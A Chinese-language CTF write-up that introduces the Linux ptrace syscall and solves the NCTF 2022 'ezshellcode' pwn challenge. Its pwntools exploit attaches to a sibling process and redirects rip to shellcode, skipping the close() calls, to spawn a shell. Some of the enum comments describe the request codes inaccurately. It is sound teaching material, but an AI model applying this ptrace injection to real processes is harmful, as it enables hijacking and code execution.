# [原创]从NCTF 2022 ezshellcode入门CTF PWN中的ptrace代码注入

> 原文: https://www.ctfiot.com/84178.html
> ID: 84178

首先了解一下ptrace函数

ptrace

ptrace即process tracer（进程跟踪），ptrace系统调用是 Linux 提供的一个调试进程的工具，其提供了一种可以观察和控制另一个进程（tracee）的方法，并检查和更改tracee的存储器和跟踪器，主要用于实施断点调试和系统调用跟踪，linux下常见的调试工具GDB原理就是基于ptrace。

使用场景

ptrace的使用场景如下

编写动态分析工具，如gdb,strace

反追踪，一个进程只能被一个进程追踪(注：一个进程能同时追踪多个进程)，若此进程已被追踪，其他基于ptrace的追踪器将无法再追踪此进程，更进一步可以实现子母进程双线执行动态解密代码等更高级的反分析技术

代码注入，往其他进程里注入代码。

不退出进程，进行在线升级

函数原型

1

2

3

4

5

6

7

8

9

long ptrace(enum __ptrace_request request, pid_t pid, void *addr,void *data);

1). enum __ptrace_request request：参数执行的行为

2). pid_t pid: ptrace要跟踪的进程号。

3). void *addr: 存放数据的地址。

4). void *data: 存放读取出的或者要写入的数据。

参数1决定了ptrace执行的指令，常见的指令如下

1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17

18

19

enum __ptrace_request

{

PTRACE_TRACEME = 0,        //被调试进程调用

PTRACE_PEEKTEXT = 1， //从内存addr处读取一个字节

PTRACE_PEEKDATA = 2,    //查看内存addr处的一个字节

PTRACE_PEEKUSER = 3,    //查看struct user 结构体的值

PTRACE_POKETEXT = 4， //查看内存addr处一个字大小的内存（4字节）

PTRACE_POKEDATA = 5,    //修改内存addr处一个字大小的内存（4字节）

PTRACE_POKEUSER = 6,    //修改struct user结构体的值

PTRACE_CONT = 7,        //被调试进程pid继续

PTRACE_SINGLESTEP = 9,    //被调试进程pid执行一条汇编指令

PTRACE_GETREGS = 12,    //获取寄存器(struct user_regs_struct)到内存data中

PTRACE_SETREGS = 13,    //设置内存data上的数据为寄存器(struct user_regs_struct)

PTRACE_ATTACH = 16,        //附加进程pid

PTRACE_DETACH = 17,        //解除附加进程pid

PTRACE_SYSCALL = 24,    //让被调试进程pid在系统调用入口或出口停止

};

long int ptrace (enum __ptrace_request __request, ...)

user_regs_struct结构体及相关偏移

这个结构体里包括了64位架构下的常见寄存器

1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17

18

19

20

21

22

23

24

25

26

27

28

29

30

struct user_regs_struct

{

__extension__ unsigned long long int r15;

__extension__ unsigned long long int r14;

__extension__ unsigned long long int r13;

__extension__ unsigned long long int r12;

__extension__ unsigned long long int rbp;

__extension__ unsigned long long int rbx;

__extension__ unsigned long long int r11;

__extension__ unsigned long long int r10;

__extension__ unsigned long long int r9;

__extension__ unsigned long long int r8;

__extension__ unsigned long long int rax;

__extension__ unsigned long long int rcx;

__extension__ unsigned long long int rdx;

__extension__ unsigned long long int rsi;

__extension__ unsigned long long int rdi;

__extension__ unsigned long long int orig_rax;

__extension__ unsigned long long int rip;

__extension__ unsigned long long int cs;

__extension__ unsigned long long int eflags;

__extension__ unsigned long long int rsp;

__extension__ unsigned long long int ss;

__extension__ unsigned long long int fs_base;

__extension__ unsigned long long int gs_base;

__extension__ unsigned long long int ds;

__extension__ unsigned long long int es;

__extension__ unsigned long long int fs;

__extension__ unsigned long long int gs;

};

64位下寄存器的偏移，可以用这个偏移查看相应内存中寄存器的值

1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17

18

19

20

21

22

23

24

25

26

27

28

29

30

31

32

##/arch/x86/include/uapi/asm/ptrace-abi.h

#define R15 0

#define R14 8

#define R13 16

#define R12 24

#define RBP 32

#define RBX 40

/* These regs are callee-clobbered. Always saved on kernel entry. */

#define R11 48

#define R10 56

#define R9 64

#define R8 72

#define RAX 80

#define RCX 88

#define RDX 96

#define RSI 104

#define RDI 112

/*

* On syscall entry, this is syscall#. On CPU exception, this is error code.

* On hw interrupt, it's IRQ number:

*/

#define ORIG_RAX 120

/* Return frame for iretq */

#define RIP 128

#define CS 136

#define EFLAGS 144

#define RSP 152

#define SS 160

#endif /* __ASSEMBLY__ */

/* top of stack page */

#define FRAME_SIZE 168

基本用法

详见ptrace使用与调试

NCTF 2022 ezshellcode

有了上面的知识后，我们来解决这道题就不难了

分析

程序很简单，首先获取了当前进程的进程号，然后输出进程号。mmap了一段地址为0x401000、大小为0x1000的可读可写可执行内存并读入shellcode，接着开启沙箱，并关闭了标准输入、标准输出、标准错误，然后执行shellcode

沙箱禁用了socket、connect、bind、listen等系统调用，防止用户向vps服务器上发送flag

利用

本题中最特殊的地方在于给出了进程号pid，然后观察docker可以发现有这么一句

1

echo 0 > /proc/sys/kernel/yama/ptrace_scope

ptrace_scope是一种安全机制，防止用户访问当前正在运行的进程的内存和状态，这种安全机制可以防止一定的安全问题，如恶意附加进程、读取和修改程序内存等。

而上述语句则允许了这种情况，相当于我们可以用ptrace附加到其他进程上，然后实现代码注入，结合本题泄露pid的特点，我们可以在一个程序中启一个ptrace附加调试到一个卡在read系统调用的进程上，然后修改寄存器或内存，使得另一个在读完shellcode之后没有去执行close(0) close(1) close(2)，而是直接按照我们设定的路径去getshell，那么就可以轻松拿到flag了

在编写shellcode的过程中，由于一个被附加调试中的进程不能再度被附加调试，我们可以通过获取寄存器的值到某一内存地址，然后通过查看内存地址的相关偏移得到某一寄存器的值，来查看程序的执行情况。

exp

首先attach上对应的进程，控制子进程使得子进程在SYSCALL的入口或出口停下来，wait4等待子进程执行；之后子进程SYSCALL的时候会获取寄存器的值，判断rax是否为0，如果为0则进入下一次循环，这样是为了防止read读取shellcode的过程被破坏；如果不为0，则控制子进程rip为0x401000，使其跳转到0x401000的shellcode上，这样没有执行三个close，直接system(“/bin/sh”)，然后就可以拿flag了

1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17

18

19

20

21

22

23

24

25

26

27

28

29

30

31

32

33

34

35

36

37

38

39

40

41

42

43

44

45

46

from pwn import *

p=process('./pwn')

# libc=ELF('./libc.so.6')

context.log_level = 'debug'

context.arch = 'amd64'

r = lambda x: p.recv(x)

ra = lambda: p.recvall()

rl = lambda: p.recvline(keepends=True)

ru = lambda x: p.recvuntil(x, drop=True)

sl = lambda x: p.sendline(x)

sa = lambda x, y: p.sendafter(x, y)

sla = lambda x, y: p.sendlineafter(x, y)

ia = lambda: p.interactive()

c = lambda: p.close()

li = lambda x: log.info(x)

db = lambda: gdb.attach(p)

r=process('./pwn')

r.recvuntil('Pid: ')

pid=int(r.recvuntil('\n'))

info('pid->'+hex(pid))

shellcode=shellcraft.ptrace(0x10,pid,0,0)

shellcode+=shellcraft.ptrace(0x18,pid,0,0)

shellcode+=shellcraft.wait4(pid,0,0)

shellcode+=shellcraft.ptrace(12,pid,0,0x401500)

shellcode+='''

mov r9,0x401000

mov r8,0x401500

mov r11,qword ptr [r8+0x78]

mov r12,0

cmp r11,r12

je return

mov qword ptr [r8+0x80],r9

'''

shellcode+=shellcraft.ptrace(13,pid,0x401500)+shellcraft.ptrace(17,pid,0,0)+'''

return:

mov r13,0x401013

jmp r13

'''

sl(asm(shellcode))

p.interactive()

r.sendline(asm(shellcraft.sh()))

r.interactive()

原文始发于CatF1y： [原创]从NCTF 2022 ezshellcode入门CTF PWN中的ptrace代码注入

---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/img_638ffeba308c8.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/img_638ffec31102e.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/img_638ffed353249.png)